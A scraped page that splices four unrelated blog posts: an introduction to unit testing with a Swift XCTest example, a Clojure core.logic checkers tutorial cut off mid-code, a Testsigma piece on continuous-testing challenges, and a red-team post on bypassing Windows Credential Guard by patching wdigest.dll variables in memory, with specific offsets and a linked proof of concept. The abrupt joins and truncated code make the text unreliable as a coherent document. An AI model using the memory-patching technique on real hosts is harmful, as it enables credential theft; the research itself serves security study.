<p>"Legacy code is the code without tests" - Micheal Feathers in 'Working Effectively with Legacy code'.</p>
</blockquote>
<h4 id="excuse-me">Excuse me ☝️</h4>
<p>We find many excuses for not writing unit tests,</p>
<ul>
<li>Writing tests slows down the development process</li>
<li>Don't have enough time</li>
<li>Anyway, we need to do E2E testing (End to End)</li>
<li>Not sure what to test</li>
<li>Don't know how to write unit tests</li>
</ul>
<p>Well, these are misconceptions we have in our minds because we really don't understand what unit testing is for. If you're also the one finding these excuses, then it is time to understand what is unit testing and automation testing pyramid.</p>
<h4 id="what-is-unit-testing">What is unit testing?</h4>
<p>Unit Testing is a level of software testing where individual units/ components of software are tested. The purpose is to validate that each unit of the software performs as designed. A unit is the smallest testable part of any software. </p>
<h4 id="automation-testing-pyramid">Automation Testing Pyramid:</h4>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598184303373/MtdF5St73.png?auto=format&amp;q=60" alt="testpyramid.png">
If you notice, writing unit tests are cheaper and faster than E2E testing. Though, unit testing cannot replace E2E testing, unit testing holds the major importance in the pyramid space. Unit testing is the base of the test pyramid. As we know clearly that a weak base can topple down the entire building and software development is no exception. And that's when we are demanding to revamp. 
I cannot resist mentioning this funny dialogue(Tamil) by Vadivelu - that explains the weak basement quite well 🥴😂
<img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598188481226/hVrZpDYbR.png?auto=format&amp;q=60" alt="basement_weak-uh.png">
If you're still wondering that unit tests are not that prominent in SDLC, you must know the benefits of writing them.</p>
<h4 id="why-unit-tests">Why unit tests?</h4>
<p>Writing unit tests allows us,</p>
<ul>
<li>To Speed up the development process in the long run and deliver new features with better confidence (I know this is opposite to what I wrote in the excuses list)</li>
<li>To Refactor with confidence </li>
<li>To get Instant feedback, much faster than running the entire application and test visually every time</li>
<li>To keep the codebase maintainable. Remember that we may not be able to write effective unit tests on a codebase that is designed badly</li>
<li>To keep the various modules and components loosely coupled</li>
<li>Unit tests tell you how it behaves. Yes, it is a kind of passive documentation for your code</li>
<li>To debug the issues easily</li>
<li>Identify breaking changes in development stage itself</li>
</ul>
<h4 id="not-sure-what-to-test">Not sure what to test?</h4>
<p>Ideally, everything! But we aren't in the ideal world. While it is a good idea to aim for 100% code coverage, we might have some classes in our application that talk to External frameworks. Our objective for writing unit testing is not to test the external frameworks and that is the reason we should keep these classes as thin as possible. If your codebase doesn't have any tests and you're beginning to write, then I would recommend you start with the core feature of your application. Most often, it is not that easy to write effective tests on your core features. The chances are that they are the giant beast classes. In this case, You might want to do refactoring before writing tests. Remember, </p>
<blockquote>
<p>The more complex the class, the more you want to write tests. </p>
</blockquote>
<h4 id="how-to-write-unit-tests">How to write unit tests?</h4>
<p>AAA (Arrange, Act, Assert) is a popular pattern that suggests to divide the test method into 3 sections,</p>
<p>There are three steps we need to follow for every unit test,</p>
<ol>
<li><strong>Arrange:</strong> This section initializes objects and sets the value of the data that is passed to the method under test. This involves topics such as Test Doubles, Dependency Injection, etc</li>
<li><strong>Act:</strong> This section invokes the method under test with the arranged parameters</li>
<li><strong>Assert:</strong> This section verifies that the action of the method under test behaves as expected</li>
</ol>
<p>Consider we are testing the class <code>Stack</code>, You must have come across the term <strong><em>SUT</em></strong> which stands for 'System Under Test'. Well, in our case <code>Stack</code> is our SUT.</p>
<pre><code><span>final</span> <span><span>class</span> <span>StackTests</span>: <span>XCTestCase</span> </span>{

    <span>var</span> sut: <span>Stack</span>&lt;<span>String</span>&gt; = <span>Stack</span>()

    <span><span>func</span> <span>test_push</span><span>()</span></span> {
        
        sut = <span>Stack</span>()
        sut.push(<span>"Hello"</span>)

        
        sut.push(<span>"Reader"</span>)

        
        <span>XCTAssertTrue</span>(sut.top.data == <span>"Reader"</span>)
    }

    <span><span>func</span> <span>test_pop</span><span>()</span></span> {
        
        sut = <span>Stack</span>()
        sut.push(<span>"Hello"</span>)
        sut.push(<span>"Reader"</span>)

        
        sut.pop()

        
        <span>XCTAssertTrue</span>(sut.top.data == <span>"Hello"</span>)
    }
}
</code></pre><p>Yeah, we are now ready to kick start our unit testing journey, I mean it. Unit testing is not a destination but a continuous journey. As our application grows, we should keep writing tests. The more unit test coverage you have, the more benefit you get. Always remember that unit tests are first-class citizens in our project and they are equally important as our production source code. So it is important to plan and structure the unit test classes as well. I've chosen a simple example but when we start writing tests to our actual code, we may encounter problems in creating mocks for a complex class, testing asynchronous code, private methods, UI Components. I will cover a separate article to address the common problems in writing tests.</p>

<p>Thank you for reading this article! Let's start doing more of <code>CMD+U</code>(Test) than <code>CMD+R</code>(Run). </p>
<p>Happy coding!</p>

<![CDATA[Let's Play Checkers with AI and Clojure]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text">
<p>Nowadays, when you hear "AI," you are probably going to think about neural networks and model training, starting to reach for data sets and envisioning how to feed them into the learning machine. 
In this post, I will try to revive a more or less forgotten way to do things—the Logic programming way.</p>
<p>Logic programming is an exciting paradigm, according to which one expresses programs in terms of relations involving some logic variables, and expects results reflecting what do these logical variables have to be so to make sure those relations are verified(Pfeww!). </p>
<p>We are so talking about "goals" that we want to succeed: We want those relations to be actually occurring, and search for the values of our logic variables that would make that happen. </p>
<p>You can see how this sort of programming - also known as relational programming - lays the foundation of an alternative way of approaching computing. It's a declarative method in which you don't explicitly specify how to process inputs into outputs, but where you instead express queries about logical variables arranged in a set of desired relations.</p>
<p>For example, consider the following logical function :</p>
<pre><code>(multiplio x y z)
</code></pre>
<p>that stands for a goal (or a relation) succeeding if z equals x times y.
It will succeed if you query for its result while you specify a relevant value for all of the three logical variables:</p>
<pre><code>(multiplio 2 3 6) ;=&gt;Success
</code></pre>
<p>But if you specify that you want to know for which values of z it will succeed, specifying actual, fixed values for x and y, you are sort of multiplying two numbers:</p>
<pre><code>(multiplio 2 3 q) ;=&gt; Success for q = 6
</code></pre>
<p>More interestingly, you can ask what might the value of x be given that y is set to 2 and that the product z at 6</p>
<pre><code>(multiplio q 3 6) ;=&gt; Success for q = 2
</code></pre>
<p>The previous examples showed how you can write programs in terms of relations, or logic goals, and specify or ask for the values of the variables you please: No inputs, no outputs, just relations.</p>
<p>Of course, when it is unable to make your goals succeed, the relational kernel will give you "nothing." On the other hand,  if it notices that the goals are achieved every time, it returns a particular value that says, well, everything.</p>
<p>In the following, we will use relational programming to create an AI solving a round of checkers game. We will use a particular language for logic programming, <a target="_blank" href="http://minikanren.org/">miniKanren</a>, through its  Clojure implementation, <a target="_blank" href="https://github.com/clojure/core.logic">core.logic</a>. </p>

<p>In core.logic, you run your queries using a special interface, run like in the following simple example:</p>
<pre><code>(run* [q]
  (== q 1))
</code></pre>
<p>That is, you're asking core.logic to run a query over the logical variable q, so that the goal (== q 1)  is verified. == is miniKanren's unification, that is, the mecanism that makes a goal who succeeds if the terms involved are the same, which sets q to (1) in our particular example. Unification is a very important operation in logical programming, and is implemented up to the level of nested Clojure datastructures:</p>
<pre><code>(run* [q]
  (== [q 2][1 2]))
</code></pre>
<p>yields (1), as we must have q set at 1 so we have the first vector as [1 2] in order to have it unified with the second term.
But the careful reader may wonder: why do we have results laid out in sequences? This is beause the logical variable we are querying over might happen to take multiple possible values; as a matter of fact, you can choose how many solution do you want core.logic to go up to. We did mention run* (star) in our query because we want all of the solutions. If we did only want to uncover first five of them, we could have emitted a query like so:</p>
<pre><code>(run 5 [q]
  (== [q 2][1 2]))
</code></pre>

<p>Enough talk and let's play checkers. For this, we are going to implement an artificial intelligence kernel capable of analyzing some checkers' board, determining – under the game rules – where to move while staying out of the reach of its opponent's attacks, and spotting when it can capture some of the enemy's soldiers.
Let's go through a little remainder of the game of checkers. You and your opponent evolve on a square chessboard, but you can only move on diagonals over black squares one step at a time. Also, you can only move forward. Both of you can capture an enemy piece if it is situated just one step away from one of your pieces, provided that when you jump over it following the diagonal, the black square where you're landing is empty. If, while doing so, from that new position, you can capture another piece, you may go on.</p>

<p>To model the battle scene, we are going to consider three sets: one for the empty positions, one for the only piece that belongs to the checkers' solver engine, and one for the enemy's locations. To describe a particular situation, you may tell the solver what's in each of these sets. As far as the items that will be put in them are concerned, we will store in them coordinates of positions on the checker's board. For instance, to tell that the enemy has 3 pieces, we just throw the 3 vectors representing the positions where these pieces are in the enemy's set. </p>
<p>The following figure explains how we are going to represent the different positions on a chessboard of 6 squares edges. Note that for its construction, to consider only the black squares, we are going to alternate a set of vectors crossing even with odd coordinates, then odd with even ones.
<img src="https://dev-to-uploads.s3.amazonaws.com/i/vwgz7dgmp0k8slnqnl4g.png" alt="Alt Text"></p>
<p>The solver is concerned about three significant matters when trying to figure out the action it must take: </p>
<ol>
<li>Where to put the checker, </li>
<li>Will the moving piece be captured when it goes there, </li>
<li>Whether it can win one or more of its opponent's pieces if after jumping, he has the opportunity to do so. Let's implement it.</li>
</ol>
<h2 id="building-the-chessboard">Building the Chessboard</h2>
<p>For starters, we are going to declare our ns. Note that we are using the finite domain constrains engine, clojure.core.logic.fd, to be able to derive goals where algebraic operations are involved:</p>
<pre><code>(ns recipe19.core
  (:require [clojure.core.logic :as logic]
            [clojure.core.logic.fd :as fd]))
</code></pre>
<p>We now focus on constructing the chessboard. As we mentioned earlier, we will build a set of vectors, associating odd x coordinates with even y ones, then the other way around: even x coordinates with odd y ones:</p>
<pre><code>(defn evenso
  [size out]
  (logic/fresh [x2 se]
    (fd/in x2 (fd/interval 0  (/ size 2)))
    ;; We construct a set of integers
    ;; going from 0 to half the size
    ;; using a core.logic finite domain
    ;; facility
    (fd/* x2 2 se)
    ;; we construct the even coords
    (logic/== out se)))
;; and we output them by unifying them
;; with output

(defn oddso [size out]
  (logic/fresh [x2 seo so]
    (fd/in x2 (fd/interval 0  (/  size 2)))
    ;; Same logic applies for odd part
    (fd/* x2 2 seo)
    ;; We generate an even number
    (fd/+ seo 1 so)
    ;; Then we add 1 to it
    (fd/&lt;= so size)
    ;; We ensure that we do not exceed
    ;; size
    (logic/== out so)))
;; And we unify with output

(defn boardo [size out]
  (logic/fresh [e o]
    (oddso size o)
    (evenso  size e)
    ;; Then starting from even and odd numbers
    (logic/conde 
     [(logic/== out [e o])]
     ;; We combine a first set of vectors
     ;; Crossing [even odd]
     [(logic/== out [o e])])))
     ;; And crossing [odd even]
</code></pre>
<h2 id="moving-the-piece">Moving the piece</h2>
<p>Let's build the goal function that determines where our piece shall go starting from a current position. This moves our piece up, incrementing the y part of the coordinates, and go to the left and to the right by adding or deducing 1 from the x component:</p>
<pre><code>(defn where-to-movo
  [empty cur-pos out]
  (logic/fresh [-&gt;x -&gt;y curx cury]
    (logic/== [curx cury] cur-pos)
    ;; We destructure the position into
    ;; x and y parts
    (logic/conde
     [(fd/+ 1 curx -&gt;x)]
     [(fd/- curx 1 -&gt;x)])
    ;; We go left or right,
    ;; adding or substracting 1
    ;; to x and storing it into -&gt;x
    (fd/+ cury 1 -&gt;y)
    ;; We can only move up, adding 1 to y
    ;; and storing it into -&gt;y
    (logic/membero [-&gt;x -&gt;y] empty)
    ;; We verify that the target position
    ;; is empty by seeing if it is present
    ;; in the empty set
    (logic/== out [-&gt;x -&gt;y])))
    ;; And we unify with the output
</code></pre>
<h2 id="dont-get-captured">Don't Get Captured!</h2>
<p>After the solver has determined where it can move its piece, it needs a goal function that tells if, at that position, that piece won't be captured by any of the opponent's pieces. That's the aim of the following goal function:</p>
<pre><code>(defn isnt-capturedo
  [empty mypos enemy out]
  (logic/fresh [x-&gt;
                      y-&gt;
                      -&gt;x
                      -&gt;y
                      y-&gt;y
                      x-&gt;x
                      new-x
                      new-y]
    (logic/== [x-&gt; y-&gt;] enemy)
    (logic/== [-&gt;x -&gt;y] mypos)
    ;; We destructure enemy and our
    ;; position
    (logic/conde
     [(fd/- x-&gt; -&gt;x x-&gt;x)]
     [(fd/- -&gt;x x-&gt; x-&gt;x)])
    ;; As core.logic.fd can't handle
    ;; negative numbers, we must use
    ;; a conde so we can get the difference
    ;; between the coords, whether is enemy's x higher
    ;; than the solver's, or the other way around.

<h2><strong>Introduction</strong></h2>



<p>Continuous Testing is the process of testing at all stages of software development – one after the another- without any human intervention. <a href="https://testsigma.com/continuous-testing" target="_blank" rel="noopener noreferrer">Continuous Testing</a> is key to faster delivery of Agile products to the market. </p>



<p>Continuous Testing makes it possible to eliminate testing as a bottleneck for faster software development and delivery. But the path to achieving Continuous Testing has its own challenges, most common of which are mentioned below.</p>



<h2><strong>Common Challenges</strong></h2>



<p><strong>1. Lack of Testability Support in Products:</strong> A test automation system is a very basic requirement for Continuous Testing. To achieve strong automated testing for a product, you need to have almost all of your test cases automated. But does the product have the testability support required to automate all test cases? Not always! If products are not designed, keeping testability in mind, achieving continuous testing may become a distant dream.</p>



<p>Achieving continuous testing for new feature work done in legacy products becomes more difficult if the product didn’t have testability support initially. Adding testability support to such products is expensive and may not always get prioritized as compared to other items on the product roadmap, draining down the efforts for Continuous Testing.</p>



<p><strong>2. Lack of Standard Tools:</strong> For a variety of products, standard tools to achieve continuous testing don’t exist. Teams often resort to using in-house test automation tools or frameworks which are neither well-documented nor well-maintained. This adds to the woes of the testing team as they now have to struggle with the issues of the tool/framework also.</p>



<p>With in-house tools/frameworks, you have the benefit of code-ownership. You can make changes to the tool/framework to get desired behaviour, but that is a costly affair in terms of resources. You are now investing your resources to evolve the tool/framework rather than the product. Practically, teams don’t have the luxury to customize the testing tool/framework for their needs when they need to deliver a quality product on an impending timeline.</p>



<p><strong>3. Lack of Faster Feedback Loops:</strong> To leverage Continuous Testing, it is important to incorporate feedback on an on-going basis. To incorporate feedback on a continuous basis, you need feedback loops in the system that can help you gather feedback in real-time. Lack of such feedback loops introduce a delay in action, later affecting the quality of the product.</p>



<p>For example, if one of the test environments used to run automation tests is down, an alert message for the same helps you act timely to rectify it rather than digging into the cause of the non-arrival of the test report for scheduled test automation run.&nbsp;</p>



<p>Similarly, it helps to have a real-time dashboard for performance which depicts the performance metrics over a period of time rather than digging into logs and code-profiler reports every time you want to check on a product’s performance. When such dashboards are accessible to everyone on the team, it helps in bringing critical issues to the table and gets them prioritized.&nbsp;</p>



<p><strong>4. Lack of Testing Infrastructure:</strong> Often, organizations embark on the path of embracing Continuous Testing, without realizing the budgetary needs for it.</p>



<p>To implement Continuous Testing, you might need additional test environments that need to be maintained and kept up and running round the clock. You might also need advanced tools to incorporate faster feedback loops.&nbsp;</p>



<p>Although these costs aren’t significant as compared to the cost incurred due to the poor quality of the product, there is a need for organizational commitment. A half-way journey to continuous testing without adequate infrastructure only adds to the woes of the testing team and doesn’t help anyone.&nbsp;&nbsp;</p>



<p><strong>5. Lack of Enough Testers:</strong> Most product teams don’t have enough testers, which sometimes creates bottlenecks for achieving continuous testing. Continuous testing is an on-going journey and requires high initial investments in terms of setup, which may create extra workload for testers.</p>



<p>Until continuous testing reaches the stage where it can replace the need for traditional testing, testers are often caught in balancing the efforts required for switching to continuous testing and their regular testing tasks that usually have a high priority w.r.t product needs. This adds to the pending backlogs for achieving continuous testing, creating a chicken-and-egg situation, where continuous testing can reduce the testing time but there is no time to set up continuous testing.</p>



<p><strong>6. <a href="https://testsigma.com/blog/why-test-data-management-is-more-important-than-you-think/" target="_blank">Test Data Management</a>:</strong> Depending on the product and its testing needs, test data management sometimes becomes a bottleneck for continuous testing.</p>



<p>Test data when stored locally for testing environments may result in different versions of test data which may be difficult to maintain. Maintaining test data in a central repository and then accessing it from different test environments may ease this problem but may introduce other issues like network latency in tests.</p>



<p><strong>7. Increased Complexity:</strong> As the scope for the product grows, so does the scope for continuous testing.</p>



<p>With a large number of tests added to the system, it becomes a challenge to make the tests execute quickly. If tests take too long to run, it defeats the whole purpose of continuous testing as quick feedback is not available. If not all tests are run, it seems like a compromise on the quality of the product. Also, if not all tests are run, it makes the effort of adding all those tests to the system go in vain.</p>



<p><strong>8. Scalability Issues:</strong> Not all testing frameworks/tools may be suitable for scaling purposes.</p>



<p>Lack of support for large concurrent test sessions and slow test executions can become serious bottlenecks for your dream of achieving Continuous Testing.</p>



<p>Such scalability issues aren’t always noticeable in the beginning. They become clearly visible only after a significant amount of tests have been added to the system and the test system starts to get highly loaded. This makes the situation worse as at such a stage, it’s even more difficult to switch to a different tool/framework.</p>



<p><strong>9. Inefficient Processes:</strong> Sometimes, the processes followed in the team/organization are not conducive for achieving Continuous Testing. Let’s check:</p><p><strong>i. Change in Requirements:</strong> If requirement specifications keep on changing frequently, it creates a lot of rework for the team, especially the testing team as tests may need to be updated every time there is a change in the requirements. This may adversely impact the efforts for continuous testing.</p><p><strong>ii. Unclear Roles and Responsibilities of Team Members:</strong> If the roles and responsibilities of team members are not clearly defined, it may result in ambiguous ownership of tasks. Such ambiguity can lead to redundant efforts on some tasks and some tasks getting totally ignored. Clear ownership of tasks is important in achieving Continuous Testing.</p><p><strong>iii. Excluding Testing Team in Initial Discussions:</strong> If the testing team is not included in all product-related discussions from the beginning, it would create gaps in the understanding which may impact continuous testing. Also, it would require additional processes such as hand-offs from Developers to Testers from time to time, adding inefficiency to the whole system.&nbsp;</p><p><strong>iv. Bureaucratic Approvals:</strong> If your team/organization functions with heavy bureaucracy and approvals are needed for every small thing, it can add inefficiency to the whole system which can make it hard to achieve continuous testing.&nbsp;</p>



<p>For example, if a test environment has gone down and you don’t have the required access privileges to bring it back up and need to wait on some other team/person for this, it can lead to inefficiency in the continuous testing pipeline.&nbsp;</p>



<h2><strong>Suggestions for Resolving Some Common Challenges</strong></h2>



<p>Most of the common challenges discussed above can be worked around with the help of some suggestions discussed below.</p>



<p><strong>1. Include Testability from Beginning:</strong></p><p><strong>i. </strong>Testability should be part of the low-level design for the product.</p><p><strong>ii. </strong>Any feature developed for the product should not be considered complete unless it has the required testability support for Continuous Testing.</p>



<p><strong>2. Evaluate Tools/Frameworks before Including them in the System:</strong></p><p><strong>i. </strong>It’s good to evaluate any testing tool/framework for required support before getting bound to it by making it part of the system.</p><p><strong>ii. </strong>The right combination of open source and paid test frameworks/tools can be used rather than relying solely on open-source test frameworks/tools.</p><p><strong>iii. </strong>Having a defined set of parameters to capture results of experiments with new tools can help in a better evaluation of tools/frameworks in a much-organized way.</p>



<p><strong>3. Evaluate Budget Requirements before Embracing Continuous Testing:</strong> Implementing Continuous Testing may need a significant budget for test environments and tools/frameworks.</p>



<p>Evaluating budget requirements before starting on the path of Continuous Testing helps in making informed decisions early rather than being stuck in the middle of the path due to budgetary constraints.</p>



<p><strong>4. Leveraging Cloud-based Virtual Infrastructure:</strong> Cloud-based test environments can be made accessible instantaneously on demand. They also save testing teams from most of the headache associated with managing and maintaining traditional test environments. Leveraging cloud-based virtual environments can help resolve a lot of issues related to the availability of test environments for Continuous Testing.&nbsp;&nbsp;</p>



<p> Using test automation tools that support test automation workflows on the cloud can further add to these benefits. Testsigma is one such tool.</p>

<p>In ye old days, a [hacker, red teamer, penetration tester, motivated child] would compromise a host, use an exploit to elevate or laterally move, and then Mimikatz their way to glory (ok, maybe not <em>just</em> in the old days).&nbsp; This is becoming increasingly more complicated to achieve.  Many new technologies have been implemented to prevent or restrict access to credentials on a compromised host.&nbsp; Last year, Adam Chester (@_xpn_) wrote an <a href="https://blog.xpnsec.com/exploring-mimikatz-part-1/">excellent blog post</a> on memory patching wdigest.dll to enable UseLogonCredentials.  This is done without dropping files to disk or changing registry keys.&nbsp; I will touch on this briefly, but I strongly recommend reading his post before reading through this.&nbsp;</p>



<p>After reading XPN’s post, myself and a co-worker started exploring other possibilities for bypassing / disabling protections using memory patching. &nbsp;Windows Defender Credential Guard seemed like an excellent target for this type of attack.</p>



<p><em>TL/DR &amp;&amp; (POC || GTFO)</em><br><em>Wdigest can be enabled on a system with Credential Guard by patching the values of g_fParameter_useLogonCredential and g_IsCredGuardEnabled in memory. <a href="https://gist.github.com/N4kedTurtle/8238f64d18932c7184faa2d0af2f1240" target="_blank" rel="noreferrer noopener">PoC located here</a>.</em></p>



<blockquote><p>“Introduced in Windows&nbsp;10 Enterprise and Windows Server 2016, Windows Defender Credential Guard uses virtualization-based security to isolate secrets so that only privileged system software can access them. Unauthorized access to these secrets can lead to credential theft attacks, such as Pass-the-Hash or Pass-The-Ticket. Windows Defender Credential Guard prevents these attacks by protecting NTLM password hashes, Kerberos Ticket Granting Tickets, and credentials stored by applications as domain credentials.” </p><cite><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard" rel="nofollow">https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard</a></cite></blockquote>



<p>Currently, the most common way to overcome Cred Guard is to register a new Security Support Provider (SSP) (<a href="https://twitter.com/gentilkiwi/status/1044715664823308289">Mimikatz memssp</a> or a custom one).&nbsp; This is generally loaded into memory and then captures and writes any credentials entered.&nbsp; This can <a href="https://blog.xpnsec.com/exploring-mimikatz-part-2/">be modified </a> (seriously, @_xpn_ is a beast) to improve opsec but we wanted to see if there was a simpler and hopefully less identifiable way to do this.</p>



<p>The first thing we should check is if we can just enable UseLogonCredential on a system with Credential Guard enabled.&nbsp; <a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard-protection-limits">Per MSDN</a>:</p>



<blockquote><p>“When Windows Defender Credential Guard is enabled, neither Digest nor CredSSP have access to users’ logon credentials. This implies no Single Sign-On use for these protocols.”</p></blockquote>



<p>This <em>suggests </em>that enabling UseLogonCredential on a system with Credential Guard will not have any impact on an attacker’s ability to get credentials from memory since Digest will not have access even if enabled.&nbsp; It still seems worth testing, just in case.</p>



<p>First, we identify the offset of g_fParameter_useLogonCredential.&nbsp; It should be noted that this will change between versions of wdigest.dll (but is static between systems with the same version).&nbsp; This can easily be done with any debugger.</p>



<figure><img data-attachment-id="50" data-permalink="https://teamhydra.blog/uselogoncred/" data-orig-file="https://teamhydradotblog.files.wordpress.com/2020/08/uselogoncred.png" data-orig-size="1016,309" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="uselogoncred" data-image-description="" data-medium-file="https://teamhydradotblog.files.wordpress.com/2020/08/uselogoncred.png?w=300" data-large-file="https://teamhydradotblog.files.wordpress.com/2020/08/uselogoncred.png?w=750" src="https://teamhydradotblog.files.wordpress.com/2020/08/uselogoncred.png?w=1016" alt="" srcset="https://teamhydradotblog.files.wordpress.com/2020/08/uselogoncred.png 1016w, https://teamhydradotblog.files.wordpress.com/2020/08/uselogoncred.png?w=150 150w, https://teamhydradotblog.files.wordpress.com/2020/08/uselogoncred.png?w=300 300w, https://teamhydradotblog.files.wordpress.com/2020/08/uselogoncred.png?w=768 768w" sizes="(max-width: 1016px) 100vw, 1016px"></figure>



<p>We can see wdigest!g_fParameter_useLogonCredential is 0x36124 bytes from the base of wdigest.dll (we are testing on Windows 10 Enterprise version 1909).&nbsp; With this information we can easily find and patch wdigest in memory on the host.</p>



<p>Let’s boot up our system and ensure that Credential Guard is enabled.</p>



<div><figure><img data-attachment-id="53" data-permalink="https://teamhydra.blog/cropped_credguardonsystem/" data-orig-file="https://teamhydradotblog.files.wordpress.com/2020/08/cropped_credguardonsystem.png" data-orig-size="1128,555" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="cropped_credguardonsystem" data-image-description="" data-medium-file="https://teamhydradotblog.files.wordpress.com/2020/08/cropped_credguardonsystem.png?w=300" data-large-file="https://teamhydradotblog.files.wordpress.com/2020/08/cropped_credguardonsystem.png?w=750" src="https://teamhydradotblog.files.wordpress.com/2020/08/cropped_credguardonsystem.png?w=1024" alt="" srcset="https://teamhydradotblog.files.wordpress.com/2020/08/cropped_credguardonsystem.png?w=1024 1024w, https://teamhydradotblog.files.wordpress.com/2020/08/cropped_credguardonsystem.png?w=150 150w, https://teamhydradotblog.files.wordpress.com/2020/08/cropped_credguardonsystem.png?w=300 300w, https://teamhydradotblog.files.wordpress.com/2020/08/cropped_credguardonsystem.png?w=768 768w, https://teamhydradotblog.files.wordpress.com/2020/08/cropped_credguardonsystem.png 1128w" sizes="(max-width: 1024px) 100vw, 1024px"></figure></div>



<p>Now, run our PoC that patches UseLogonCredential.</p>



<div><figure><img data-attachment-id="54" data-permalink="https://teamhydra.blog/cropped_patchlogoncredentials/" data-orig-file="https://teamhydradotblog.files.wordpress.com/2020/08/cropped_patchlogoncredentials.png" data-orig-size="568,181" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="cropped_patchlogoncredentials" data-image-description="" data-medium-file="https://teamhydradotblog.files.wordpress.com/2020/08/cropped_patchlogoncredentials.png?w=300" data-large-file="https://teamhydradotblog.files.wordpress.com/2020/08/cropped_patchlogoncredentials.png?w=568" src="https://teamhydradotblog.files.wordpress.com/2020/08/cropped_patchlogoncredentials.png?w=568" alt="" srcset="https://teamhydradotblog.files.wordpress.com/2020/08/cropped_patchlogoncredentials.png 568w, https://teamhydradotblog.files.wordpress.com/2020/08/cropped_patchlogoncredentials.png?w=150 150w, https://teamhydradotblog.files.wordpress.com/2020/08/cropped_patchlogoncredentials.png?w=300 300w" sizes="(max-width: 568px) 100vw, 568px"></figure></div>



<p>Finally, log in with a new user and see if we got credentials…..</p>



<div><figure><img data-attachment-id="55" data-permalink="https://teamhydra.blog/failed_mimi/" data-orig-file="https://teamhydradotblog.files.wordpress.com/2020/08/failed_mimi.png" data-orig-size="442,132" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="failed_mimi" data-image-description="" data-medium-file="https://teamhydradotblog.files.wordpress.com/2020/08/failed_mimi.png?w=300" data-large-file="https://teamhydradotblog.files.wordpress.com/2020/08/failed_mimi.png?w=442" src="https://teamhydradotblog.files.wordpress.com/2020/08/failed_mimi.png?w=442" alt="" srcset="https://teamhydradotblog.files.wordpress.com/2020/08/failed_mimi.png 442w, https://teamhydradotblog.files.wordpress.com/2020/08/failed_mimi.png?w=150 150w, https://teamhydradotblog.files.wordpress.com/2020/08/failed_mimi.png?w=300 300w" sizes="(max-width: 442px) 100vw, 442px"></figure></div>



<p>Unsurprisingly, we are still unable to get new credentials.&nbsp; However, it seems like there may be more here to investigate, so we return to looking at wdigest.dll and see what other variables exist that could be of interest to us.</p>



<div><figure><img data-attachment-id="57" data-permalink="https://teamhydra.blog/globalvars/" data-orig-file="https://teamhydradotblog.files.wordpress.com/2020/08/globalvars.png" data-orig-size="696,647" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="globalvars" data-image-description="" data-medium-file="https://teamhydradotblog.files.wordpress.com/2020/08/globalvars.png?w=300" data-large-file="https://teamhydradotblog.files.wordpress.com/2020/08/globalvars.png?w=696" src="https://teamhydradotblog.files.wordpress.com/2020/08/globalvars.png?w=696" alt="" srcset="https://teamhydradotblog.files.wordpress.com/2020/08/globalvars.png 696w, https://teamhydradotblog.files.wordpress.com/2020/08/globalvars.png?w=150 150w, https://teamhydradotblog.files.wordpress.com/2020/08/globalvars.png?w=300 300w" sizes="(max-width: 696px) 100vw, 696px"></figure></div>



<p>g_IsCredGuardEnabled is set to 1 when Cred Guard is enabled on a system.&nbsp; Unsetting this value seems to be worth trying.</p>



<p>&nbsp;Using the same technique as we used previously to get the offset to UseLogonCredential, we find the offset for g_IsCredGuardEnabled (here it is 0x35b88) and patch. &nbsp;Sadly, setting this value to 0 seemed to have no impact on anything relevant to our purposes.&nbsp; It turns out that the SpAcceptCredentials function in wdigest.dll checks both UseLogonCredential and IsCredGuardEnabled values to determine how to handle caching credentials. (We noticed later that XPN pointed out this value in his blog, but never goes farther into it).</p>



